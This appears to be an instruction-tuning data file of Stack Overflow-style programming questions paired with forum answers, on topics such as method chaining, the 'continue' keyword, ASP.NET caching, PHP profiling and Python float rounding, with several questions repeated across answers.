{"instruction": "Say instead of returning void a method you returned a reference to the class even if it didn't make any particular semantic sense.  It seems to me like it would give you more options on how the methods are called, allowing you to use it in a fluent-interface-like style and I can't really think of any disadvantages since you don't have to do anything with the return value (even store it).\nSo suppose you're in a situation where you want to update an object and then return its current value.\ninstead of saying \nmyObj.Update();\nvar val = myObj.GetCurrentValue();\n\nyou will be able to combine the two lines to say\nvar val = myObj.Update().GetCurrentValue();\n\n\nEDIT:  I asked the below on a whim, in retrospect, I agree that its likely to be unnecessary and complicating, however my question regarding returning this rather than void stands.\nOn a related note, what do you guys think of having the language include a new bit of syntactic sugar:\nvar val = myObj.Update()<.GetCurrentValue();\n\nThis operator would have a low order of precedence so myObj.Update() would execute first and then call  GetCurrentValue() on myObj instead of the void return of Update.\nEssentially I'm imagining an operator that will say \"call the method on the right-hand side of the operator on the first valid object on the left\".  Any thoughts?", "output": "I think as a general policy, it simply doesn't make sense. Method chaining in this manner works with a properly defined interface but it's only appropriate if it makes semantic sense. \nYour example is a prime one where it's not appropriate, because it makes no semantic sense.\nSimilarly, your syntactic sugar is unnecessary with a properly designed fluent interface.\nFluent interfaces or method chaining can work very well, but need to be designed carefully."}
{"instruction": "For programmers working in corporate environments and outside of the start up world, there are a wide variety of non-technical people that are important stakeholders in the development process.  These include other functions within the company such as marketing, finance and legal, for example, and also include customers and others outside the company.\nThe point of this question is not \u201ccare and feeding\u201d of these groups, but simply what tools have been found to work to facilitate collaboration and necessary interaction?  I\u2019m thinking along of the lines of IM versus wikis versus traditional email distribution lists, or the corporate sharepoint portal, but wonder what others have found to work.", "output": "Basecamp is a joy to use, and its primary focus is project management through collaboration."}
{"instruction": "Please, now that I've re-written the question, and before it suffers from further fast-gun answers or premature closure by eager editors let me point out that this is not a duplicate of this question.  I know how to remove duplicates from an array.\nThis question is about removing sequences from an array, not duplicates in the strict sense.\nConsider this sequence of elements in an array;\n[0] a\n[1] a\n[2] b\n[3] c\n[4] c\n[5] a\n[6] c\n[7] d\n[8] c\n[9] d\n\nIn this example I want to obtain the following...\n[0] a\n[1] b\n[2] c\n[3] a\n[4] c\n[5] d\n\nNotice that duplicate elements are retained but that sequences of the same element have been reduced to a single instance of that element.\nFurther, notice that when two lines repeat they should be reduced to one set (of two lines).\n[0] c\n[1] d\n[2] c\n[3] d\n\n...reduces to...\n[0] c\n[1] d\n\nI'm coding in C# but algorithms in any language appreciated.", "output": "EDIT: made some changes and new suggestions\nWhat about a sliding window...\nREMOVE LENGTH 2: (no other length has other matches)\n//the lower case letters are the matches\nABCBAbabaBBCbcbcbVbvBCbcbcAB  \n__ABCBABABABBCBCBCBVBVBCBCBCAB\n\nREMOVE LENGTH 1 (duplicate characters):\n//* denote that a string was removed to prevent continual contraction\n//of the string, unless this is what you want.\nABCBA*BbC*V*BC*AB\n_ABCBA*BBC*V*BC*AB\n\nRESULT:\nABCBA*B*C*V*BC*AB == ABCBABCVBCAB\n\nThis is of course starting with length=2, increase it to L/2 and iterate down. \nI'm also thinking of two other approaches:\n\ndigraph - Set a stateful digraph with the data and iterate over it with the string, if a cycle is found you'll have a duplication. I'm not sure how easy it is check check for these cycles... possibly some dynamic programming, so it could be equivlent to method 2 below. I'm going to have to think about this one as well longer.\ndistance matrix - using a levenstein distance matrix you might be able to detect duplication from diagonal movement (off the diagonal) with cost 0. This could indicate duplication of data. I will have to think about this more."}
{"instruction": "For programmers working in corporate environments and outside of the start up world, there are a wide variety of non-technical people that are important stakeholders in the development process.  These include other functions within the company such as marketing, finance and legal, for example, and also include customers and others outside the company.\nThe point of this question is not \u201ccare and feeding\u201d of these groups, but simply what tools have been found to work to facilitate collaboration and necessary interaction?  I\u2019m thinking along of the lines of IM versus wikis versus traditional email distribution lists, or the corporate sharepoint portal, but wonder what others have found to work.", "output": "We use Quickbase here. Meets all our goals."}
{"instruction": "For programmers working in corporate environments and outside of the start up world, there are a wide variety of non-technical people that are important stakeholders in the development process.  These include other functions within the company such as marketing, finance and legal, for example, and also include customers and others outside the company.\nThe point of this question is not \u201ccare and feeding\u201d of these groups, but simply what tools have been found to work to facilitate collaboration and necessary interaction?  I\u2019m thinking along of the lines of IM versus wikis versus traditional email distribution lists, or the corporate sharepoint portal, but wonder what others have found to work.", "output": "You may want to take a look at these products:\n\nFogBugz - The brainchild of StackOverflow co-founder Joel Spolsky.  Handles bug reports, feature requests, wiki, and more.  I have used FogBugz before and it has been pretty solid, despite being written in its own language.\nBaseCamp - The flagship product of 37signals.  I haven't personally tried this but it has gotten rave reviews from some people I know and respect."}
{"instruction": "Say instead of returning void a method you returned a reference to the class even if it didn't make any particular semantic sense.  It seems to me like it would give you more options on how the methods are called, allowing you to use it in a fluent-interface-like style and I can't really think of any disadvantages since you don't have to do anything with the return value (even store it).\nSo suppose you're in a situation where you want to update an object and then return its current value.\ninstead of saying \nmyObj.Update();\nvar val = myObj.GetCurrentValue();\n\nyou will be able to combine the two lines to say\nvar val = myObj.Update().GetCurrentValue();\n\n\nEDIT:  I asked the below on a whim, in retrospect, I agree that its likely to be unnecessary and complicating, however my question regarding returning this rather than void stands.\nOn a related note, what do you guys think of having the language include a new bit of syntactic sugar:\nvar val = myObj.Update()<.GetCurrentValue();\n\nThis operator would have a low order of precedence so myObj.Update() would execute first and then call  GetCurrentValue() on myObj instead of the void return of Update.\nEssentially I'm imagining an operator that will say \"call the method on the right-hand side of the operator on the first valid object on the left\".  Any thoughts?", "output": "I know in Java they're actually thinking about making this standard behaviour for void methods. If you do that you don't need the extra syntactic sugar.\nThe only downside I can think of is performance. But that's easilly measured. I'll get back to you with the results in a few minutes :-)\nEdit:\nReturning a reference is a bit slower than returning void .. what a surprise. So that's the only downside. A few more ticks when calling your function."}
{"instruction": "I'm creating an ASP.NET web site where all pages hang off a database-driven tree-hierarchy.  Pages typically present HTML content.  But, some will execute programming.\nExamples: (1) a \"contact us\" form or (2) a report generator\nHow should I represent/reference the programming within the database?  Should I have a varchar value of a Web User Control (.ascx) name?  Or a Web Form (.aspx) name?  Something else?  Or should it just be an integer or other such ID in a dictionary within my application?\nCan I make an ASP.NET Site Map Provider with this structure?\nSee more information here: Which is the best database schema for my navigation?", "output": "You might consider inserting placeholders like <my:contact-us-form/> in the database on specific pages; that way the database can describe all the static text content instead of completely replacing that database-driven content with an .ascx control."}
{"instruction": "Say instead of returning void a method you returned a reference to the class even if it didn't make any particular semantic sense.  It seems to me like it would give you more options on how the methods are called, allowing you to use it in a fluent-interface-like style and I can't really think of any disadvantages since you don't have to do anything with the return value (even store it).\nSo suppose you're in a situation where you want to update an object and then return its current value.\ninstead of saying \nmyObj.Update();\nvar val = myObj.GetCurrentValue();\n\nyou will be able to combine the two lines to say\nvar val = myObj.Update().GetCurrentValue();\n\n\nEDIT:  I asked the below on a whim, in retrospect, I agree that its likely to be unnecessary and complicating, however my question regarding returning this rather than void stands.\nOn a related note, what do you guys think of having the language include a new bit of syntactic sugar:\nvar val = myObj.Update()<.GetCurrentValue();\n\nThis operator would have a low order of precedence so myObj.Update() would execute first and then call  GetCurrentValue() on myObj instead of the void return of Update.\nEssentially I'm imagining an operator that will say \"call the method on the right-hand side of the operator on the first valid object on the left\".  Any thoughts?", "output": "The only disadvantage I can see is that it makes the API slightly more confusing.  Let's say you have some collection object with a remove() method that would normally return void.  Now you want to return a reference to the collection itself.  The new signature would look like:\npublic MyCollection remove(Object someElement)\n\nJust looking at the signature, it's not clear that you're returning a reference to the same instance.  Maybe MyCollection is immutable and you're returning a new instance.  In some cases, like here, you would need some external documentation to clarify this.\nI actually like this idea, and I believe that there was some talk in retrofitting all void methods in Java7 to return a reference to 'this', but it ultimately fell through."}
{"instruction": "What can be a practical solution to center vertically and horizontally content in HTML that works in Firefox, IE6 and IE7?\nSome details:\n\nI am looking for solution for the entire page.\nYou need to specify only width of the element to be centered. Height of the element is not known in design time.\nWhen minimizing window, scrolling should appear only when all white space is gone.\nIn other words, width of screen should be represented as:  \n\n\"leftSpace width=(screenWidth-widthOfCenteredElement)/2\"+\n\"centeredElement width=widthOfCenteredElement\"+\n\"rightSpace width=(screenWidth-widthOfCenteredElement)/2\"  \nAnd the same for the height:\n\"topSpace height=(screenHeight-heightOfCenteredElement)/2\"+\n\"centeredElement height=heightOfCenteredElement\"+\n\"bottomSpace height=(screenWidth-heightOfCenteredElement)/2\"\n\nBy practical I mean that use of tables is OK. I intend to use this layout mostly for special pages like login. So CSS purity is not so important here, while following standards is desirable for future compatibility.", "output": "Is this what you are trying to accomplish?   If not, please explain what is different than the image below?"}
{"instruction": "For programmers working in corporate environments and outside of the start up world, there are a wide variety of non-technical people that are important stakeholders in the development process.  These include other functions within the company such as marketing, finance and legal, for example, and also include customers and others outside the company.\nThe point of this question is not \u201ccare and feeding\u201d of these groups, but simply what tools have been found to work to facilitate collaboration and necessary interaction?  I\u2019m thinking along of the lines of IM versus wikis versus traditional email distribution lists, or the corporate sharepoint portal, but wonder what others have found to work.", "output": "We setup a wiki for shared documents, memos, status reports, etc. It took about an hour to train the entire staff, but it was well worth it."}
{"instruction": "This question is addressed to a degree in this question on LINQ to SQL .dbml best practices, but I am not sure how to add to a question.\nOne of our applications uses LINQ to SQL and we have currently have one .dbml file for the entire database which is becoming difficult to manage.  We are looking at refactoring it a bit into separate files that are more module/functionality specific, but one problem is that many of the high level classes would have to be duplicated in several .dbml files as the associations can't be used across .dbml files (as far as I know), with the additional partial class code as well.\nHas anyone grappled with this problem and what recommendations would you make?", "output": "Take advantage of the namespace settings. You can get to it in properties from clicking in the white space of the ORM.\nThis allows me to have a Users table and a User class for one set of business rules and a second (but the same data store) Users table and a User class for another set of business rules.\nOr, break up the library, which should also have the affect of changing the namespacing depending on your company's naming conventions. I've never worked on an enterprise app where I needed access to every single table."}
{"instruction": "Say instead of returning void a method you returned a reference to the class even if it didn't make any particular semantic sense.  It seems to me like it would give you more options on how the methods are called, allowing you to use it in a fluent-interface-like style and I can't really think of any disadvantages since you don't have to do anything with the return value (even store it).\nSo suppose you're in a situation where you want to update an object and then return its current value.\ninstead of saying \nmyObj.Update();\nvar val = myObj.GetCurrentValue();\n\nyou will be able to combine the two lines to say\nvar val = myObj.Update().GetCurrentValue();\n\n\nEDIT:  I asked the below on a whim, in retrospect, I agree that its likely to be unnecessary and complicating, however my question regarding returning this rather than void stands.\nOn a related note, what do you guys think of having the language include a new bit of syntactic sugar:\nvar val = myObj.Update()<.GetCurrentValue();\n\nThis operator would have a low order of precedence so myObj.Update() would execute first and then call  GetCurrentValue() on myObj instead of the void return of Update.\nEssentially I'm imagining an operator that will say \"call the method on the right-hand side of the operator on the first valid object on the left\".  Any thoughts?", "output": "Isn't this how \"fluent interfaces\" - like those that JQuery utilizes - are built?  One benefit is supposed to be code readability (though the wikipedia entry at http://en.wikipedia.org/wiki/Fluent_interface mentions that some find it NOT readable).  Another benefit is in code terseness, you lose the need to set properties in 7 lines of code and then call a method on that object in the 8th line.\nMartin Fowler (who coined the term here - http://martinfowler.com/bliki/FluentInterface.html) says that there is more to fluent interfaces than method chaining, however method chaining is a common technique to use with fluent interfaces.\nEDIT:\nI was actually coming back here to edit my answer and add that there is no disadvantage to returning this instead of void in any measurable way, when I saw George's comment pointing out that I did forget to discuss the point of the question.  Sorry for the initial \"pointless\" rambling."}
{"instruction": "The __doPostBack is not working in firefox 3 (have not checked 2).  Everything is working great in IE 6&7 and it even works in Chrome??\nIt's a simple asp:LinkButton with an OnClick event\n<asp:LinkButton ID=\"DeleteAllPicturesLinkButton\" Enabled=\"False\" OnClientClick=\"javascript:return confirm('Are you sure you want to delete all pictures? \\n This action cannot be undone.');\" OnClick=\"DeletePictureLinkButton_Click\" CommandName=\"DeleteAll\" CssClass=\"button\" runat=\"server\">\n\nThe javascript confirm is firing so I know the javascript is working, it's specirically the __doPostBack event.  There is a lot more going on on the page, just didn't know if it's work it to post the entire page.\nI enable the control on the page load event.\nAny ideas?\n\nI hope this is the correct way to do this, but I found the answer.  I figured I'd put it up here rather then in a stackoverflow \"answer\"\nSeems it had something to do with nesting ajax toolkit UpdatePanel. When I removed the top level panel it was fixed.\nHope this helps if anyone else has the same problem.  I still don't know what specifically was causing the problem, but that was the solution for me.", "output": "Seems it had something to do with nesting ajax toolkit UpdatePanel.  When I removed the top level panel it was fixed.\nHope this helps if anyone else has the same problem."}
{"instruction": "For programmers working in corporate environments and outside of the start up world, there are a wide variety of non-technical people that are important stakeholders in the development process.  These include other functions within the company such as marketing, finance and legal, for example, and also include customers and others outside the company.\nThe point of this question is not \u201ccare and feeding\u201d of these groups, but simply what tools have been found to work to facilitate collaboration and necessary interaction?  I\u2019m thinking along of the lines of IM versus wikis versus traditional email distribution lists, or the corporate sharepoint portal, but wonder what others have found to work.", "output": "When setting up a wiki you have to agree on what sorts of information go where.\nWhen working with a mixed audience of technical and non-technical I've found that having some sort of executive summary, overview, reader's digest version with click-throughs to more detailed info is definitely the way to go.\nFor statuses, e.g. daily builds, regression test results, etc., you might like to consider making a dashboard page that reports everything of interest in a RAG (red, amber, green) status at the top level. Then you can click-though to drill down to more detail if required.\nI implemented this for a major project and had RAG status for continuous builds and regression tests.\nClicking on the RAG indicators brought up more detail. This was repeated for several levels so at the top level you had the RAG indicator.\nFor example, clicking on the indicator for the regular build took you down to see what had broken the build, clicking again took you further to see who had broken the build, clicking again brought you down to the actual error message from the compiler.\nThat was fun to implement.\ncheers,\nRob"}
{"instruction": "We have an ASP.NET application that manages it's own User, Roles and Permission database and we have recently added a field to the User table to hold the Windows domain account.  \nI would like to make it so that the user doesn't have to  physically log in to our application, but rather would be automatically logged in based on the currently logged in Windows domain account DOMAIN\\username.  We want to authenticate the Windows domain account against our own User table.  \nThis is a piece of cake to do in Windows Forms, is it possible to do this in Web Forms?\nI don't want the user to be prompted with a Windows challenge screen,  I want our system to handle the log in.\nClarification: We are using our own custom Principal object.\nClarification: Not sure if it makes a difference or not, but we are using IIS7.", "output": "Request.ServerVariables[\"REMOTE_USER\"]\nThis is unverified for your setup, but I recall using this awhile back."}
{"instruction": "For programmers working in corporate environments and outside of the start up world, there are a wide variety of non-technical people that are important stakeholders in the development process.  These include other functions within the company such as marketing, finance and legal, for example, and also include customers and others outside the company.\nThe point of this question is not \u201ccare and feeding\u201d of these groups, but simply what tools have been found to work to facilitate collaboration and necessary interaction?  I\u2019m thinking along of the lines of IM versus wikis versus traditional email distribution lists, or the corporate sharepoint portal, but wonder what others have found to work.", "output": "I've heard anecdotal evidence (an oxymoron surely) that they get on well with Wiki's provided they have a WYSIWYG editor.\n(I used to be involved with the TWiki.org project and I know they have a WYSIWYG Plugin but I'm sure \"other options are available\".)"}
{"instruction": "I want to point a file dialog at a particular folder in the current user's Local Settings folder on Windows.  What is the shortcut to get this path?", "output": "Environment.GetFolderPath( Environment.SpecialFolders.LocalApplicationData);?\nI can't remember if there is a \"Local Settings\" folder on Windows XP anymore, it seems vaguely familiar."}
{"instruction": "I want to point a file dialog at a particular folder in the current user's Local Settings folder on Windows.  What is the shortcut to get this path?", "output": "How about this, for example:\nString appData = \n    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);\n\nI don't see an enum for just the Local Settings folder.\nhttp://web.archive.org/web/20080303235606/http://dotnetjunkies.com/WebLog/nenoloje/archive/2007/07/07/259223.aspx has a list with examples."}
{"instruction": "Will the code below work if the clock on the server is ahead of the clock on the client?\nResponse.Cache.SetExpires(DateTime.Now.AddSeconds(-1))\n\nEDIT: the reason I ask is on one of our web apps some users are claiming they are seeing the pages ( account numbers, etc ) from a user that previously used that machine.  Yet we use the line above and others to 'prevent' this from happening.", "output": "This question covers making sure a webpage is not cached.  It seems you have to set several properties to ensure a web page is not cached across all browsers."}
{"instruction": "Please, now that I've re-written the question, and before it suffers from further fast-gun answers or premature closure by eager editors let me point out that this is not a duplicate of this question.  I know how to remove duplicates from an array.\nThis question is about removing sequences from an array, not duplicates in the strict sense.\nConsider this sequence of elements in an array;\n[0] a\n[1] a\n[2] b\n[3] c\n[4] c\n[5] a\n[6] c\n[7] d\n[8] c\n[9] d\n\nIn this example I want to obtain the following...\n[0] a\n[1] b\n[2] c\n[3] a\n[4] c\n[5] d\n\nNotice that duplicate elements are retained but that sequences of the same element have been reduced to a single instance of that element.\nFurther, notice that when two lines repeat they should be reduced to one set (of two lines).\n[0] c\n[1] d\n[2] c\n[3] d\n\n...reduces to...\n[0] c\n[1] d\n\nI'm coding in C# but algorithms in any language appreciated.", "output": "Here's C# app i wrote that solves this problem.\ntakes\naabccacdcd  \noutputs\nabcacd  \nProbably looks pretty messy, took me a bit to get my head around the dynamic pattern length bit.\nclass Program\n{\n    private static List<string> values;\n    private const int MAX_PATTERN_LENGTH = 4;\n\n    static void Main(string[] args)\n    {\n        values = new List<string>();\n        values.AddRange(new string[] { \"a\", \"b\", \"c\", \"c\", \"a\", \"c\", \"d\", \"c\", \"d\" });\n\n\n        for (int i = MAX_PATTERN_LENGTH; i > 0; i--)\n        {\n            RemoveDuplicatesOfLength(i);\n        }\n\n        foreach (string s in values)\n        {\n            Console.WriteLine(s);\n        }\n    }\n\n    private static void RemoveDuplicatesOfLength(int dupeLength)\n    {\n        for (int i = 0; i < values.Count; i++)\n        {\n            if (i + dupeLength > values.Count)\n                break;\n\n            if (i + dupeLength + dupeLength > values.Count)\n                break;\n\n            var patternA = values.GetRange(i, dupeLength);\n            var patternB = values.GetRange(i + dupeLength, dupeLength);\n\n            bool isPattern = ComparePatterns(patternA, patternB);\n\n            if (isPattern)\n            {\n                values.RemoveRange(i, dupeLength);\n            }\n        }\n    }\n\n    private static bool ComparePatterns(List<string> pattern, List<string> candidate)\n    {\n        for (int i = 0; i < pattern.Count; i++)\n        {\n            if (pattern[i] != candidate[i])\n                return false;\n        }\n\n        return true;\n    }\n}\n\nfixed the initial values to match the questions values"}
{"instruction": "Will the code below work if the clock on the server is ahead of the clock on the client?\nResponse.Cache.SetExpires(DateTime.Now.AddSeconds(-1))\n\nEDIT: the reason I ask is on one of our web apps some users are claiming they are seeing the pages ( account numbers, etc ) from a user that previously used that machine.  Yet we use the line above and others to 'prevent' this from happening.", "output": "Your problem could be caused by the browser remembering data entered into form fields. You can turn this off like this:\n<input autocomplete=\"off\">"}
{"instruction": "Here's my first question at SO.\nI have a internal application for my company which I've been recently ask to maintain. The applications is built in PHP and its fairly well coded (OO, DB Abstraction, Smarty) nothing WTF-ish. \nThe problem is the applications is very slow.\nHow do I go about finding out what's slowing the application down? I've optimized the code to make very few DB queries, so I know that it is the PHP code which is taking a while to execute. I need to get some tools which can help me with this and need to devise a strategy for checking my code.\nI can do the checking/strategy work myself, but I need more PHP tools to figure out where my app is crapping up. \nThoughts?", "output": "Watch this presentation by Rasmus Lerdorf (creator of PHP). He goes into some good examples of testing PHP speed and what to look for as well as some internals that can slow things down. XDebug is one tool he uses. He also makes a very solid point about knowing what performance cost you're getting into with frameworks.\nVideo:\nhttp://www.archive.org/details/simple_is_hard\nSlides (since it's hard to see on the video):\nhttp://talks.php.net/show/drupal08/1"}
{"instruction": "A Little Background Information:\nI've been looking at a few PHP framework recently, and it came down to two. The Zend Framework or CodeIgniter. \nI prefer CodeIgniter, because of its simple design. It's very bare bone, and it is just kept simple. The thing I don't like though is the weak template system. The template system is important for me, because I will be working with another designer. Being able to give him a good template system is a big plus.\nZend was the second choice, because of the better template system that is built in. Zend is a different beast though compared to CodeIgniter. It emphasis \"loose coupling between modules\", but is a bigger framework. I don't like to feel like I have many things running under the hood that I never use. That is unnecessary overhead in my opinion, so I thought about putting a template system into CodeIgniter: Smarty.\nQuestion(s): How easy/hard is the process to integrate Smarty into CodeIgniter? From my initial scan of the CodeIgniter documentation, I can see that the layout of the framework is easy enough to understand, and I anticipate no problems. I want to know if anyone has used it before, and therefore are aware of any \"gotchas\" you my have experienced that is going to make this harder than it should be or impossible to pull off. I also want to know if this is a good thing to do at all. Is the template system in CodeIgniter enough for normal use? Are there any other template modules that are good for CodeIgniter aside from Smarty? I better off with Zend Framework? Is any wheel being invented here? Thank you for your help!", "output": "Slightly OT, hope you don't mind...\nI'm a Zend Framework user and I think it's worth saying that the loose coupling means you don't need to include any files you're not actively using.  Hopefully this negates your concern about unnecessary overhead.\nWith the layouts stuff added in a recent release of ZF, its templating is really hard to fault... and it's completely pluggable as Favio mentions.  The more I use ZF, the more I like it; they do things the way I would do them!"}
{"instruction": "Here's my first question at SO.\nI have a internal application for my company which I've been recently ask to maintain. The applications is built in PHP and its fairly well coded (OO, DB Abstraction, Smarty) nothing WTF-ish. \nThe problem is the applications is very slow.\nHow do I go about finding out what's slowing the application down? I've optimized the code to make very few DB queries, so I know that it is the PHP code which is taking a while to execute. I need to get some tools which can help me with this and need to devise a strategy for checking my code.\nI can do the checking/strategy work myself, but I need more PHP tools to figure out where my app is crapping up. \nThoughts?", "output": "ifs its a large code base try apc if you're not already.\nhttp://pecl.php.net/package/APC"}
{"instruction": "What does the , operator do in C?", "output": "The comma operator combines the two expressions either side of it into one, evaluating them both in left-to-right order.  The value of the right-hand side is returned as the value of the whole expression.\n (expr1, expr2) is like { expr1; expr2; } but you can use the result of expr2 in a function call or assignment.\nIt is often seen in for loops to initialise or maintain multiple variables like this:\nfor (low = 0, high = MAXSIZE; low < high; low = newlow, high = newhigh)\n{\n    /* do something with low and high and put new values\n       in newlow and newhigh */\n}\n\nApart from this, I've only used it \"in anger\" in one other case, when wrapping up two operations that should always go together in a macro.  We had code that copied various binary values into a byte buffer for sending on a network, and a pointer maintained where we had got up to:\nunsigned char outbuff[BUFFSIZE];\nunsigned char *ptr = outbuff;\n\n*ptr++ = first_byte_value;\n*ptr++ = second_byte_value;\n\nsend_buff(outbuff, (int)(ptr - outbuff));\n\nWhere the values were shorts or ints we did this:\n*((short *)ptr)++ = short_value;\n*((int *)ptr)++ = int_value;\n\nLater we read that this was not really valid C, because (short *)ptr is no longer an l-value and can't be incremented, although our compiler at the time didn't mind.  To fix this, we split the expression in two:\n*(short *)ptr = short_value;\nptr += sizeof(short);\n\nHowever, this approach relied on all developers remembering to put both statements in all the time.  We wanted a function where you could pass in the output pointer, the value and and the value's type.  This being C, not C++ with templates, we couldn't have a function take an arbitrary type, so we settled on a macro:\n#define ASSIGN_INCR(p, val, type)  ((*((type) *)(p) = (val)), (p) += sizeof(type))\n\nBy using the comma operator we were able to use this in expressions or as statements as we wished:\nif (need_to_output_short)\n    ASSIGN_INCR(ptr, short_value, short);\n\nlatest_pos = ASSIGN_INCR(ptr, int_value, int);\n\nsend_buff(outbuff, (int)(ASSIGN_INCR(ptr, last_value, int) - outbuff));\n\nI'm not suggesting any of these examples are good style!  Indeed, I seem to remember Steve McConnell's Code Complete advising against even using comma operators in a for loop: for readability and maintainability, the loop should be controlled by only one variable, and the expressions in the for line itself should only contain loop-control code, not other extra bits of initialisation or loop maintenance."}
{"instruction": "Should developers avoid using continue in C# or its equivalent in other languages to force the next iteration of a loop? Would arguments for or against overlap with arguments about Goto?", "output": "I don't think continue could ever be as difficult as goto since continue never moves execution out of the code block that it is in."}
{"instruction": "Should developers avoid using continue in C# or its equivalent in other languages to force the next iteration of a loop? Would arguments for or against overlap with arguments about Goto?", "output": "I think there should be more use of continue!\nToo often I come across code like:\nfor (...)\n{\n   if (!cond1)\n   {\n      if (!cond2)\n      {\n          ... highly indented lines ...\n      }\n   }\n}\n\ninstead of \nfor (...)\n{\n   if (cond1 || cond2)\n   {\n      continue;\n   }\n\n   ...\n}\n\nUse it to make the code more readable!"}
{"instruction": "Should developers avoid using continue in C# or its equivalent in other languages to force the next iteration of a loop? Would arguments for or against overlap with arguments about Goto?", "output": "Is continue any more harmful than, say, break?\nIf anything, in the majority of cases where I encounter/use it, I find it makes code clearer and less spaghetti-like."}
{"instruction": "Should developers avoid using continue in C# or its equivalent in other languages to force the next iteration of a loop? Would arguments for or against overlap with arguments about Goto?", "output": "You can write good code with or without continue and you can write bad code with or without continue.\nThere probably is some overlap with arguments about goto, but as far as I'm concerned the use of continue is equivalent to using break statements (in loops) or return statement from anywhere in a method body - if used correctly it can simplify the code (less likely to contain bugs, easier to maintain)."}
{"instruction": "What's the best way in c# to determine is a given QFE/patch has been installed?", "output": "The most reliable way is to determine which files are impacted by the QFE and use System.Diagnostics.FileVersionInfo.GetVersionInfo(path) on each file and compare the version numbers.\nedit: I think there's a way to check the uninstall information in the registry as well, but if the QFE ever becomes part of a Service Pack or rollup package that might report false negatives"}
{"instruction": "Should developers avoid using continue in C# or its equivalent in other languages to force the next iteration of a loop? Would arguments for or against overlap with arguments about Goto?", "output": "Continue is a really useful function in most languages, because it allows blocks of code to be skipped for certain conditions.\nOne alternative would be to uses boolean variables in if statements, but these would need to be reset after every use."}
{"instruction": "Are there any tools to facilitate a migration from Sourcegear's Vault to Subversion?\nI'd really prefer an existing tool or project (I'll buy!).\nRequirements:\n\nOne-time migration only\nFull history with comments\n\nOptional:\n\nSome support for labels/branches/tags\nRelatively speedy. It can take hours but not days.\nCost if available\n\nBonus points if you can share personal experience related to this process.\n\nOne of the reasons I'd like to do this is because we have lots of projects spread between Vault and Subversion (we're finally away from sourcesafe). It'd be helpful in some situations to be able to consolidate a particular customer's repos to SVN.\nAdditionally, SVN is better supported among third party tools. For example, Hudson and Redmine.\nAgain, though: we're not abandoning vault altogether.", "output": "I never found an easy way to convert from Vault to svn.  Basically we took our latest branches and trunk and started new in svn.  Honestly I went two or three labels back, just because.  I kept the vault db around for six months and we never needed to go back to it for data.  So I assume you want to carry forward your history for a bug tracker tie-in; at this same time we transferred our outstanding bug list to a new tracker, so that definitely made things more convenient.  If we where staying with the same bug tracker, I would think we would of started a new instance of it for the new repo.  Good Luck!\nBrett"}
{"instruction": "Here's my first question at SO.\nI have a internal application for my company which I've been recently ask to maintain. The applications is built in PHP and its fairly well coded (OO, DB Abstraction, Smarty) nothing WTF-ish. \nThe problem is the applications is very slow.\nHow do I go about finding out what's slowing the application down? I've optimized the code to make very few DB queries, so I know that it is the PHP code which is taking a while to execute. I need to get some tools which can help me with this and need to devise a strategy for checking my code.\nI can do the checking/strategy work myself, but I need more PHP tools to figure out where my app is crapping up. \nThoughts?", "output": "phpED (http://www.nusphere.com/products/phped.htm) also offers great debugging and profiling, and the ability to add watches, breakpoints, etc in PHP code. The integrated profiler directly offers a time breakdown of each function call and class method from within the IDE. Browser plugins also enable quick integration with Firefox or IE (i.e. visit slow URL with browser, then click button to profile or debug).\nIt's been very useful in pointing out where the app is slow in order to concentrate most coding effort; and it avoids wasting time optimising already fast code. Having tried Zend and Eclipse, I've now been sold on the ease of use of phpED.\nBear in mind both Xdebug and phpED (with DBG) will require an extra PHP module installed when debugging against a webserver. phpED also offers (untried by me) a local debugging option too."}
{"instruction": "Should developers avoid using continue in C# or its equivalent in other languages to force the next iteration of a loop? Would arguments for or against overlap with arguments about Goto?", "output": "continue feels wrong to me. break gets you out of there, but continue seems just to be spaghetti.\nOn the other hand, you can emulate continue with break (at least in Java).\nfor (String str : strs) contLp: {\n    ...\n       continue contLp;\n    ...\n}\n\ncontinue can be useful in some circumstances, but it still feels dirty to me.\nfor (char c : cs) {\n    final int i;\n    if ('0' <= c && c <= '9') {\n        i = c - '0';\n    } else if ('a' <= c && c <= 'z') {\n        i = c - 'a' + 10;\n    } else {\n        continue;\n    }\n    ... use i ...\n}"}
{"instruction": "Should developers avoid using continue in C# or its equivalent in other languages to force the next iteration of a loop? Would arguments for or against overlap with arguments about Goto?", "output": "goto can be used as a continue, but not the reverse.\nYou can \"goto\" anywhere, thus break flow control arbitrarily.\nThus continue, not nearly as harmful."}
{"instruction": "Should developers avoid using continue in C# or its equivalent in other languages to force the next iteration of a loop? Would arguments for or against overlap with arguments about Goto?", "output": "If continue is causing a problem with readability, then chances are you have other problems.  For example, massive amounts of code inside a for loop.  If you have to write large for loops, I would try to stick to using continue close to the top of the for loop.  Otherwise, a continue buried deep in the middle of a for loop can easily be missed."}
{"instruction": "The documentation for the round() function states that you pass it a number, and the positions past the decimal to round. Thus it should do this:\nn = 5.59\nround(n, 1) # 5.6\n\nBut, in actuality, good old floating point weirdness creeps in and you get:\n5.5999999999999996\n\nFor the purposes of UI, I need to display 5.6. I poked around the Internet and found some documentation that this is dependent on my implementation of Python. Unfortunately, this occurs on both my Windows dev machine and each Linux server I've tried. See here also.\nShort of creating my own round library, is there any way around this?", "output": "round(5.59, 1) is working fine. The problem is that 5.6 cannot be represented exactly in binary floating point.\n>>> 5.6\n5.5999999999999996\n>>>\n\nAs Vinko says, you can use string formatting to do rounding for display.\nPython has a module for decimal arithmetic if you need that."}
{"instruction": "Will the code below work if the clock on the server is ahead of the clock on the client?\nResponse.Cache.SetExpires(DateTime.Now.AddSeconds(-1))\n\nEDIT: the reason I ask is on one of our web apps some users are claiming they are seeing the pages ( account numbers, etc ) from a user that previously used that machine.  Yet we use the line above and others to 'prevent' this from happening.", "output": "As far as I can tell, the browser will check the expiry date against the local clock (although it will account for the time zone), so the code in your question may not work as you expect if the client's clock is inaccurate.  Most commonly, this happens when their time looks right but is set to the wrong timezone, meaning the UTC timestamps are actually out by several hours.\nYou could try setting a much older timestamp, say: 0000 1st Jan 1970 GMT  (epoch)\nI think the code you have should work with the server side caching, but you can more explicitly disable it with:\nResponse.Cache.SetNoServerCaching();"}
{"instruction": "Should developers avoid using continue in C# or its equivalent in other languages to force the next iteration of a loop? Would arguments for or against overlap with arguments about Goto?", "output": "There are not harmful keywords. There's only harmful uses of them.\nGoto is not harmful per se, neither is continue. They need to be used carefully, that's all."}
